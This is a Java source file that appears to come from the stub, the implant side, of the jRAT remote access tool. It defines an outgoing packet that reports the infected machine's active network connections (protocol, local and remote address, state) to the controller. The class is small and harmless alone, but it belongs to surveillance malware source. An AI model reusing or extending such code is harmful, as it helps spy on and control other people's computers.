package io.jrat.stub.packets.outgoing;

import io.jrat.common.io.StringWriter;

import java.io.DataOutputStream;


public class Packet51ActivePort extends AbstractOutgoingPacket {

	private String protocol;
	private String address;
	private String remoteAddress;
	private String state;

	public Packet51ActivePort(String protocol, String address, String state, String remoteAddress) {
		this.protocol = protocol;
		this.address = address;
		this.state = state;
		this.remoteAddress = remoteAddress;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(protocol);
		sw.writeLine(address);
		sw.writeLine(remoteAddress);
		sw.writeLine(state);
	}

	@Override
	public short getPacketId() {
		return 51;
	}

}
